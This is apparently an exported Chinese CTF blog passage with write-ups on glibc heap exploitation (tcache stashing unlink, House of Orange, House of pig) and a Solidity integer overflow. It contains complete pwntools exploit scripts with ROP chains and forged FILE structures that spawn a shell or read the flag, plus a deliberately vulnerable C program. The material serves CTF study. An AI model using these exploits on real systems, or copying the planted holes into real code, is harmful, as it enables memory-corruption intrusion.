e-&gt;key = NULL;  return (void *) e;&#125;\n\n赋值了新放入tcachebin的chunk的fd域和key值\n这里存在一个任意地址写 如果我们修改链表头chunk的bk域为一个fake chunk 那么接下来 fake chunk就会进入smallbin链表 充当下一次的tc_victim\n在作为tcache_put的参数时 其fd域和存放key的地址就被赋值了\n还有一种任意写的情况是  tcachebin中已经有了6个free chunk了 那么此时fake chunk就不会被放入tcache链表 仍然位于smallbin中 所以其fd域会填入main_arena的值 用来保证链表完整性\n下面来结合gdb动调 看一下这两种任意写要如何构造\n先看tcachebin有5个free chunk的情况\n\n此时tcachebin中已经有了5个free chunk\n我们称低地址处的smallbin chunk为chunk0 另外一个为chunk1\nchunk0位于smallbin的链表头 我们修改chunk0的bk域 使其指向fake chunk\n接着我们断点打在calloc函数 si单步进入 跟进到int_malloc函数 si单步进入\n\n此时r14赋值后的值则为fake chunk的地址\n\n这一步赋值了fake chunk的bk域 到这里fake chunk已经进入了smallbin 来看一下目前其fd域和bk域\n\n接下来fake chunk要被放入到tcachebin中 并且fd域和key值需要重新赋值\n\n下图可以看到 fd域已经成功被修改\n\n接下来 这个cmp是绕过的关键\n\nr13为此时tcachebin链表中的chunk数  可以看到 chunk1和fake chunk都被放入了链表中 此时不会进行额外的检查 任意写顺利结束\n \n最后的攻击效果为fake chunk被并入链表中 同时fake chunk+0x10处写入了堆地址\n当然 上面的执行流程看起来没有多少检查 但是实际上存在一个需要注意的地方\n\n这里需要保证我们fake chunk+0x18处为一个可写地址 如果为空 那么r14会被赋值为0 执行到下面这步时 会由于为空 导致无法写入 程序无法执行下去\n\n如果tcachebin中的chunk小于5个呢  这意味着我们上面提到的cmp肯定过不去 会进入另外一个分支\n\n可以看到面临和上面一样的问题 所以又回归到了上面的问题 那么我们有没有办法做到真正的任意地址写一个main\n_arena地址呢\n只需要使得tcachebin中已经有6个free chunk 就可以使得fake chunk不被放入tcachebin中  使得其fd域不需要进行赋值 同时由于fake chunk仍然处于smallbin中 其fd域为main_arena的地址 而非堆地址 来看一下实际的效果\n\n真题分析hitcon_ctf_2019_one_punch复现环境可以在buuctf中找到  libc版本为2.29\n\n保护全开 同时开启了沙盒 只能通过orw来获取flag\n程序的主题逻辑就是一个菜单题 add函数通过calloc来申请chunk 同时对chunk的size存在限制0x80-0x400  不存在堆溢出 free chunk的时候指针没有置零 存在UAF 同时拥有打印chunk内容的机会 并且还有一个特殊的函数\n__int64 __fastcall sub_15BB(__int64 a1, __int64 a2)&#123;  void *buf; // [rsp+8h] [rbp-8h]  if ( *(qword_4030 + 32) &lt;= 6 )    error(&quot;gg&quot;, a2);  buf = malloc(0x217uLL);  if ( !buf )    error(&quot;err&quot;, a2);  if ( read(0, buf, 0x217uLL) &lt;= 0 )    error(&quot;io&quot;, buf);  puts(&quot;Serious Punch!!!&quot;);  puts(&amp;unk_2128);  return puts(buf);&#125;\n\n检测tcache链表中的chunk数 只有大于6才能调用该函数 利用malloc申请一个0x217大小的chunk 实际上是分配一个0x210的chunk\n首先利用UAF 重复释放chunk 填满tcachebin 使chunk释放进入unsortedbin 泄露libc地址\nadd(0,cyclic(0x210))add(1,cyclic(0x80))for i in range(6):    delete(0)    edit(0,cyclic(0x10))for i in range(6):    delete(1)    edit(1,cyclic(0x10))delete(0)show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,cyclic(0x10))delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1e4ca0success(&quot;libc_addr :&quot;+hex(libc_addr))\n\n接着构造出两个同样大小的smallbin chunk 准备进行任意写攻击\nadd(1,cyclic(0x180))add(1,cyclic(0x400))add(2,cyclic(0x100))for i in range(7):    delete(1)    edit(1,cyclic(0x10))delete(1)add(2,cyclic(0x370))add(2,cyclic(0x400))\n\n此时tcache对应链表中有6个chunk 此时可以往ptr_addr+0x10写入一个libc地址\nadd(2,cyclic(0x370))add(2,cyclic(0x400))fd = heap_addr + 0x180bk = heap_addr - 0x260 + 0x20payload = cyclic(0x370)+p64(0)+p64(0x91)+p64(fd)+p64(bk)edit(1,payload)add(1,cyclic(0x80))\n\n这里选择往tcache结构体中写入\n\n覆盖了0x220链表的chunk数量\n接着就可以利用特殊函数打tcachebin attack任意写了 不过由于要用orw 再加上这题的add函数有点特殊 是先读入chunk内容 再申请chunk 接着复制内容进入chunk中 所以payload会先写在栈上 那么我们劫持malloc_hook为跳转执行栈上的rop链即可\n\n可以看到偏移0x40处为写入的rop链 那么此时只需要覆盖malloc_hook为add rsp，0x40 即可跳转执行rop链\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,29861)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(index,payload):    io.recvuntil(&quot;&gt; &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;idx: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;hero name: &quot;)    io.send(payload)def edit(index,payload):    io.recvuntil(&quot;&gt; &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;idx: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;hero name: &quot;)    io.send(payload)def show(index):    io.recvuntil(&quot;&gt; &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;idx: &quot;)    io.sendline(str(index))def delete(index):    io.recvuntil(&quot;&gt; &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;idx: &quot;)    io.sendline(str(index))def magic(payload):    io.recvuntil(&quot;&gt; &quot;)    io.sendline(b&#x27;50056&#x27;)    io.send(payload)# add(0,cyclic(0x210))# for i in range(7):#     add(1,cyclic(0x210))#     delete(1)# delete(0)# show(0)# libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1e4ca0# success(&quot;libc_addr :&quot;+hex(libc_addr))# show(1)# heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop  = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xf20# success(&quot;heap_addr :&quot;+hex(heap_addr))# debug()add(0,cyclic(0x210))add(1,cyclic(0x80))for i in range(6):    delete(0)    edit(0,cyclic(0x10))for i in range(6):    delete(1)    edit(1,cyclic(0x10))delete(0)show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,cyclic(0x10))delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1e4ca0success(&quot;libc_addr :&quot;+hex(libc_addr))malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_addr = libc_addr + 0x000000000012bda6rax_addr = libc_addr + next(libc.search(asm(&quot;pop rax;ret&quot;)))syscall_addr = libc_addr + libc.sym[&#x27;read&#x27;] +0xfopen_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]addrsp_addr = libc_addr + 0x0000000000044734bss_addr = libc_addr + libc.bss()add(1,cyclic(0x180))add(1,cyclic(0x400))add(2,cyclic(0x100))for i in range(7):    delete(1)    edit(1,cyclic(0x10))delete(1)add(2,cyclic(0x370))add(2,cyclic(0x400))fd = heap_addr + 0x180bk = heap_addr - 0x260 + 0x20payload = cyclic(0x370)+p64(0)+p64(0x91)+p64(fd)+p64(bk)edit(1,payload)add(1,cyclic(0x80))edit(0,p64(malloc_hook))magic(b&#x27;./flag\\x00\\x00&#x27;)orw = p64(rdi_addr)+p64(heap_addr)+p64(rsi_addr)+p64(0)+p64(rdx_addr)+p64(0)+p64(rax_addr)+p64(2)+p64(syscall_addr)orw += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(rax_addr)+p64(0)+p64(syscall_addr)orw += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(rax_addr)+p64(1)+p64(syscall_addr)magic(p64(addrsp_addr))# gdb.attach(io,&#x27;b *$rebase(0x139C)&#x27;)# pause(0)add(1,orw)# pause()io.recv()\n\n","categories":["堆"]},{"title":"整型溢出","url":"/2023/05/08/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/","content":"基础知识这一个知识点比较简单 最好理解 在solidity语言中 整型数据分为int型和uint型 对应着有符号数和无符号数\n如果学过简单的计算机组成原理 那么应该清楚 整型数据通过二进制存储 只有0和1 如果一个无符号数 规定了位数来限制范围\n如果超过这个范围 就会造成预期外的变化\n比如定义一个uint8的数据 其范围为0-255 如果令其为255后再加上1\n加1前 1111 1111加1后 0000 0000\n\n其二进制仍旧会正常进位 结果就导致最后的结果为0 如果是赋值为0后减去1呢\n加1前 0000 0000加1后 1111 1111\n\n最后的结果是255\n真题分析bytectf2019 hfpragma solidity ^0.4.24;contract hf &#123;    address secret;    uint count;    address owner;        mapping(address =&gt; uint) public balanceOf;    mapping(address =&gt; uint) public gift;        struct node &#123;        address nodeadress;        uint nodenumber;    &#125;        node public node0;        event SendFlag(string b64email);        constructor()public&#123;        owner = msg.sender;    &#125;        function payforflag(string b64email) public &#123;        require(balanceOf[msg.sender] &gt;= 100000);        balanceOf[msg.sender]=0;        owner.transfer(address(this).balance);        emit SendFlag(b64email);    &#125;        //to fuck        modifier onlySecret() &#123;        require(msg.sender == secret);        _;    &#125;        function profit() public&#123;        require(gift[msg.sender]==0);        gift[msg.sender]=1;        balanceOf[msg.sender]+=1;    &#125;        function hfvote() public payable&#123;        uint geteth=msg.value/1000000000000000000;        balanceOf[msg.sender]+=geteth;    &#125;        function ubw() public payable&#123;        if (msg.value &lt; 2 ether)        &#123;            node storage n = node0;            n.nodeadress=msg.sender;            n.nodenumber=1;        &#125;        else        &#123;            n.nodeadress=msg.sender;            n.nodenumber=2;        &#125;    &#125;        function fate(address to,uint value) public onlySecret &#123;        require(balanceOf[msg.sender]-value&gt;=0);        balanceOf[msg.sender]-=value;        balanceOf[to]+=value;    &#125;    &#125;\n\n合约获取flag需要通过payforflag函数 而其需要余额大于100000 接着往下看 找找有没有漏洞函数\nprofit函数可以给我们的余额加1\nhfvote函数负责记录我们转入的以太币 之所以要除以10的18次方 是因为以太币的基本单位是 1 Eth &#x3D; 10^18 Wei\nubw函数有一个关键的漏洞 先来看if分支 初始化了n 随后把n的两个成员赋值了 以供fate函数转账用\n但是else分支 并没有对n进行初始化 这意味着其赋值会按照插槽的顺序下来 也就说msg.sender会被赋值给secret 而2会被赋值给count\n由于fate函数是被onlySecret修饰的 在我们没有得到sercret之前没有办法调用 但是现在就可以调用了 其存在一个整形溢出的漏洞\n看似函数开始对余额和要转出的以太币进行了比较 但是实际上其计算结果还是一个无符号整数 哪怕余额小于value 最后的结果仍然是一个极大的整数 所以是恒大于0的\n那么就存在一个整型溢出 可以使得我们的余额被赋值为一个很大的数 就可以获取flag\n","categories":["区块链"]},{"title":"House of Orange","url":"/2023/05/11/House-of-Orange/","content":"前言这一个house of链应该算是最早的伪造io file来达到攻击目的的链了\n借助这个来熟悉一下file结构体 这个链本身现在已经失去价值了 只能适用于libc2.23及以前的版本\n这条链可以突破没有free函数的限制 并且达到劫持程序执行流的目的\nFile结构File是linux标准IO库中用来描述文件的结构 程序的许多操作会涉及到遍历File结构体来获取对应指针\nfile结构的本质上是一个链表 链表头为IO_list_all 每个file结构的chain域指向下一个file结构\n每个程序启动时有三个文件流是默认打开的 就是stdin stdout stderr\n\n至于vtable 是一个存放许多函数指针的结构体\n\nhouse of orange所涉及到的就是伪造上述的这两个结构体 从而劫持程序执行流\n链路流程分析我们知道 当plmalloc初始化堆后 如果bin中没有合适的chunk 就会从top chunk中分配所需要的chunk 那么如果所申请的chunk大于top chunk呢 分两种情况\n一种是申请的chunk的size过大 需要通过mmap来分配 那么这种情况分配到的chunk就会位于libc地址上的一块空间\n还有一种是top chunk过小 那么此时就会把top chunk释放进入unsortedbin 随后再次申请一个top chunk 从新的top chunk中分配所需要的chunk 不过释放top chunk还需要进行一次判断 下面来看一下源码\n/* There are no usable arenas and mmap also failed.  */ if (av == NULL)   return 0; /* Record incoming configuration of top */ old_top = av-&gt;top; old_size = chunksize (old_top); old_end = (char *) (chunk_at_offset (old_top, old_size)); brk = snd_brk = (char *) (MORECORE_FAILURE); /*    If not the first time through, we require old_size to be    at least MINSIZE and to have prev_inuse set.  */ assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||         ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;          prev_inuse (old_top) &amp;&amp;          ((unsigned long) old_end &amp; (pagesize - 1)) == 0)); /* Precondition: not enough current space to satisfy nb request */ assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));\n\n可以看到需要进行两次的assert检查\n第一次 对top chunk的大小进行检查 需要大于MINSIZE 并且Prev_inuse位要为1 top chunk的addr和size加起来还要满足刚好为一个页\n我们覆盖top chunk的size 使得其不足以供我们分配 这个size要使得top chunk的结尾后3位为000\n\n此时我们覆盖top chunk的size 接下来申请一个大于其size的chunk top chunk就会被释放进入unsortedbin\n\n通过这种办法 可以在程序没有给予释放chunk的函数下 获得一个unsortedbin中的chunk 而在2.23及以下的版本 unsortedbin attack来任意写一个main_arena地址还是可行的 这意味着我们拥有了一次任意写的机会\n我们上面说到过 file结构本质是一个链表 是通过链表头的IO_list_all的chain域来链接到下一个的file结构体\n那么如果我们覆盖IO_list_all指针存放的值 接着伪造一个file结构体 把chain域覆盖成fake_file的地址 就可以实现扰乱程序索引file结构体\n但是unsortedbin attack任意写的功效是有限的 只能写入main_arena+88的地址 那么根据偏移 其chain域会索引到main_arena+88+0x68处\n0x0   _flags0x8   _IO_read_ptr0x10  _IO_read_end0x18  _IO_read_base0x20  _IO_write_base0x28  _IO_write_ptr0x30  _IO_write_end0x38  _IO_buf_base0x40  _IO_buf_end0x48  _IO_save_base0x50  _IO_backup_base0x58  _IO_save_end0x60  _markers0x68  _chain0x70  _fileno0x74  _flags20x78  _old_offset0x80  _cur_column0x82  _vtable_offset0x83  _shortbuf0x88  _lock0x90  _offset0x98  _codecvt0xa0  _wide_data0xa8  _freeres_list0xb0  _freeres_buf0xb8  __pad50xc0  _mode0xc4  _unused20xd8  vtable\n\n\n而这个偏移的地址 刚好是smallbins中 0x60的链表所位于的地址 所以我们可以释放一个0x60大小的chunk到smallbins 随后任意写覆盖io_list_all为main_arena+88 这样索引到的下一个file结构体就是smallbin chunk  伪造file结构体 就可以在这个chunk中伪造\n接着是如何触发的问题 只是伪造肯定不能满足劫持执行流的目的 同时如何伪造也要根据触发的方式\n这里涉及到了FSOP的知识点\n其是通过IO_flush_all_lockp这个函数 这个函数会刷新io_list_all链表中的所有文件流 相当于对每个函数调用了fflush函数\n而这个函数会调用到file结构体中vtable结构体中的IO_overflow函数 \n如下图 我们这样伪造一个file结构体\n\n其vtable也被我们所伪造 来看以下vtable\n\n将其overflow函数指针伪造成system 接下来利用gdb动调进入IO_flush_all_lockp函数 看看其调用system函数时的rdi参数时什么\n\n可以看到rdi参数实际上是我们所伪造的file结构体的首地址 所以只要使得fake file的首地址为&#x2F;bin&#x2F;sh即可\n那么如何触发IO_flush_all_lockp函数呢 一共有三种选择\n\n当 libc 执行 abort 流程时\n\n当执行 exit 函数时\n\n当执行流从 main 函数返回时\n\n\n这里使用的是第一种办法 相对来说更加通用\n这个abort流程是什么呢 实际上我们破坏了堆结构 导致调用malloc_printerr函数来输出错误信息\n至于具体是哪里的我没动调出来 大致的猜测是unsortedbin的bk指向的地址没有构成完整的双向链表导致的进入while循环 但是这个if分支为啥会成立就是个疑点了\nif (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                             chunk2mem (victim), av);\n\nmalloc_printerr函数种会调用__libc_message函数\n\n这个函数的内部就调用了abort函数\n\n而abort内部调用了_IO_flush_all_lockp函数 \n\n于是就可以调用到fake file的io_overflow函数\n同时我们再来看一下_IO_flush_all_lockp函数怎样才能调用了file结构体的io_overflow函数\nif (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)      &#123;        result = EOF;     &#125;\n\n需要使得mode小于等于0 IO_write_ptr大于IO_write_base\n那么就使得io_write_ptr &#x3D; 1 io_write_base &#x3D; mode &#x3D; 0即可\n还有一点需要注意的是 main_arena+88的那个fake file 如果我们触发了_IO_flush_all_lockp函数 其如果满足上面的条件 也是会调用overflow函数 但是很明显不能在这里就调用overflow函数\n如下图 _mode的值是否为正负和aslr和pie导致的地址随机化有关 所以这里存在一个概率打通的问题 需要mode为负才能打通\n\n真题分析houseoforange hitcon 2016add函数限制了申请chunk的size 小于等于0x1000\nshow函数可以打印堆块内容\nedit函数存在堆溢出\n但是没有释放堆块的函数 同时chunk指针只能保存一个 所以show和edit都只对最新申请的chunk有效\n\n申请一个chunk会额外申请两个chunk   低地址处的chunk存放着实际分配的chunk和第三个chunk的地址\n中间的chunk是实际分配的chunk  第三个chunk是用来存放price和color 不过没啥用 这题的核心考点不在于这两个伴随堆块\n利用上面提到的办法 来使得top chunk被释放进入unsortedbin 随后申请一个chunk 就可以泄露libc基址\n并且 如果申请到的是一个largebin chunk 那么还可以顺便泄露一下堆地址\nadd(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x21)+p32(0)+p32(0x1f)+cyclic(0x10)+p64(0xfa1)edit(len(payload),payload)add(0x1000,b&#x27;aaaa&#x27;)add(0x400,cyclic(0x8))show()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x3c5188success(&quot;libc_addr :&quot;+hex(libc_addr))edit(0x10,cyclic(0x10))show()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xc0success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n接下来就是利用unsortedbin attack来往io_list_all中写入main_arena的地址\n随后计算偏移构造fake file\nfake_io = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = cyclic(0x408)+p64(0x21)+cyclic(0x10)  #填充到old top chunkfake_file = b&#x27;/bin/sh\\x00&#x27;+p64(0x60) #覆盖size 使其释放到smallbin 0x60链表fake_file += p64(0)+p64(fake_io-0x10) #伪造bk域fake_file += p64(0)+p64(1) #布局io_write_ptr和io_write_basefake_file = fake_file.ljust(0xc0,b&#x27;\\x00&#x27;) #填充偏移payload += fake_file + p64(0)*3+p64(heap_addr+0x5c8)+p64(0)*2+p64(system_addr) #伪造vtable结构体\n\n随后再次进入add函数 只要触发了malloc函数 就可以触发fake file\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,29861)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(size,payload):    io.recvuntil(&quot;Your choice : &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Length of name :&quot;)    io.send(str(size))    io.recvuntil(&quot;Name :&quot;)    io.send(payload)    io.recvuntil(&quot;Price of Orange:&quot;)    io.send(b&#x27;aaaa&#x27;)    io.recvuntil(&quot;Color of Orange:&quot;)    io.send(str(1))def show():    io.recvuntil(&quot;Your choice : &quot;)    io.sendline(b&#x27;2&#x27;)def edit(size,payload):    io.recvuntil(&quot;Your choice : &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Length of name :&quot;)    io.send(str(size))    io.recvuntil(&quot;Name:&quot;)    io.send(payload)    io.recvuntil(&quot;Price of Orange:&quot;)    io.send(b&#x27;aaaa&#x27;)    io.recvuntil(&quot;Color of Orange:&quot;)    io.send(str(1))add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x21)+p32(0)+p32(0x1f)+cyclic(0x10)+p64(0xfa1)edit(len(payload),payload)add(0x1000,b&#x27;aaaa&#x27;)add(0x400,cyclic(0x8))show()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x3c5188success(&quot;libc_addr :&quot;+hex(libc_addr))edit(0x10,cyclic(0x10))show()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xc0success(&quot;heap_addr :&quot;+hex(heap_addr))fake_io = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = cyclic(0x408)+p64(0x21)+cyclic(0x10)fake_file = b&#x27;/bin/sh\\x00&#x27;+p64(0x60)fake_file += p64(0)+p64(fake_io-0x10)fake_file += p64(0)+p64(1)fake_file = fake_file.ljust(0xc0,b&#x27;\\x00&#x27;)payload += fake_file + p64(0)*3+p64(heap_addr+0x5c8)+p64(0)*2+p64(system_addr)edit(len(payload),payload)io.recvuntil(&quot;Your choice : &quot;)# gdb.attach(io,&#x27;b *$rebase(0xD68)&#x27;)# pause(0)io.sendline(b&#x27;1&#x27;)# pause()io.interactive()\n\n","categories":["堆"]},{"title":"House of pig","url":"/2023/05/12/House-of-pig/","content":"前言针对calloc函数不能申请tcachebin的一种利用链 通过伪造file结构体 调用io_str_overflow函数来获取shell\n总体的伪造难度不是很大 强烈建议先只看io链的调用 不看我的解析 然后尝试自己伪造file结构体 可以很大程度提高能力\n调用链分析这条链的触发形式 还是跟高版本下的链差不多 通过覆盖IO_list_all 来在堆上伪造file结构体 从而覆盖到vtable\n不过本链的vtable并不需要我们伪造 原本的vtable是 IO_file_jumps指针 如果触发IO_flush_all_lockp函数 那么就会调用到IO_file_jumps对应偏移处的IO_file_overflow函数\n\n与之对应的 如果我们将vtable修改为IO_str_jumps呢 那么索引到的就会是 IO_str_jumps函数\n\n这个函数就是我们今天所利用的关键 ida打开2.31的libc文件 来看一下函数内部进行了什么样的操作\n\n先进行了malloc 再利用memcpy往申请到的堆空间写入数据 再次调用free函数\n那么这里就存在一个致命的漏洞 我们刚才说到 这条链是使用于没有malloc函数 只有calloc函数 无法调用到tcachebin中的chunk 但是我们可以通过Tcache stashing unlink attack 来把hook函数写入到tcachebin中  接着利用这里面的malloc申请出来 同时利用memcpy来覆盖hook函数 最后 如果我们覆盖的是free_hook 再伪造v4参数为&#x2F;bin&#x2F;sh 就可以触发system(“&#x2F;bin&#x2F;sh”)\n那么总结一下 我们为了伪造链 并触发其 需要做到:\n1.覆盖IO_list_all为堆地址2.往tcachebin链表中写入free_hook-0x10(之所以要减去0x10 后面会提及)3.构造fake_file  覆盖vtable为IO_str_jumps 伪造IO_str_overflow需要的参数 触发system\n\n同时第二步需要注意 我们在Tcache stashing unlink attack中提到 要想把fake chunk放到tcachebin上 还需要满足fake chunk+0x8处为一个可写地址 所以实际上我们要利用largebin attack任意写两次\n看到这里 你就可以试着自己去伪造一下file结构体了 尝试是否能够打通 下面是我自己一直在用的调试源码 可以自行编译 里面包含了大部分常见的漏洞 可以给复现很大帮助\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void gift()&#123;    size_t puts_addr = (size_t)&amp;puts;    printf(&quot;%p&quot;,(void *)puts_addr);&#125;void menu()&#123;    puts(&quot;Life is fucking movie&quot;);    puts(&quot;Life is always full of unhappiness, like this question&quot;);    puts(&quot;Anyway, what&#x27;s your answer&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    int index;    char size[20];    puts(&quot;What do you really want?&quot;);    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time);        puts(&quot;You can customize the size of chunk, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);        chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;error&quot;);            exit(0);        &#125;    &#125;else&#123;        exit(0);        puts(&quot;&quot;);    &#125;&#125;void add2()&#123;    int index;    char size[20];    puts(&quot;What do you really want?&quot;);    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time);        puts(&quot;You can customize the size of chunk, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);        chunk_ptr[chunk_time] = calloc(1,chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;error&quot;);            exit(0);        &#125;    &#125;else&#123;        exit(0);        puts(&quot;&quot;);    &#125;&#125;void delete()&#123;    char data[100];    int index;    puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    int size;    puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;);    scanf(&quot;%d&quot;,&amp;size);    puts(&quot;Come back!&quot;);    read(0,chunk_ptr[index],size);&#125;void show()&#123;    puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to debug heap vulnerabilities&quot;);    puts(&quot;write by chen&quot;);    while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                gift();                break;            case 6:                add2();                break;            case 7:                puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;);                puts(&quot;You will be stronger next time I see you&quot;);                exit(0);                break;        &#125;    &#125;&#125;\n\n接下来的详细伪造 我也会以此程序举例\n伪造过程分析如何覆盖IO_list_all和把free_hook-0x10放到tcachebin链表上的过程这里就不过多赘述了 还需要根据题目情况来完成\n直接来看如何伪造\n\n如果al寄存器的二进制形式最后一位为1 就会跳转 显然这里不能让他跳转 所以要控制一下rax寄存器的值 往上朔源一下\n\n可以发现和rdi寄存器有关系  而rdi寄存器经过动调发现 rdi的值是用来伪造file结构体的堆块的chunk头的prev_size域 使其最后一位不为1即可\n接下来 顺利来到malloc函数  申请多大的chunk和rdi寄存器有关系 索引一下发现和r12寄存器有关系\n\nr12的初始值由rbx+0x40处的地址决定 随后减去了r14的值 最后malloc申请的大小等于r12*2 + 0x64\n\n\n同时rbx的值和rdi是一样的 所以这里r14的值和r12也可以被我们赋值 那么这里r12的值就要为\n*malloc_size  &#x3D; (r12-r14) 2 + 0x68\n由于free_hook-0x10放入的tcachebin链表范围很大 所以这里的size其实不用太担心 接着往下看\nmemcpy在gdb中的形式是这个函数 我也不知道啥原因\n总之si进去看看怎么个赋值法\n\n\n由这四行汇编决定 其中vmovdqu可以操作128位的数据 也就是0x10字节 至于是采用xmm0寄存器来赋值 还是xmm1寄存器 我们来看一下决定地址的rdi寄存器,rsi寄存器,rdx寄存器\n回顾一下进入memcpy函数前的三行汇编 rdi的值和rax有关系 rdx的值和r12有关系 而影响xmm寄存器的rsi和r14有关系\n那我们来屡一下思路 首先 rdi+rdx-0x10 一定要能覆盖到free_hook 结合上面所说的 可以操作128位的数据 所以最后的地址为free_hook-0x8是最后的底线了\nrdi的值没有办法更改 和rax挂钩 而rax是用来伪造的堆的chunk头起始地址 所以rdx为0x18是一个比较合适的值\n那么还有一个rsi寄存器的值 和r14挂钩 我们之前不是说过 r12还要减去r14 然后再计算成为malloc的参数嘛 所以r14这里要想给xmm寄存器赋值system函数的真实地址(用来覆盖free_hook) 就需要r14是一个存放system地址的地址 那么这里自然是一个堆地址合适 可以供我们控制\n那么r12的值就是r14+0x18  那么这里各个寄存器的值都确定下来了以后 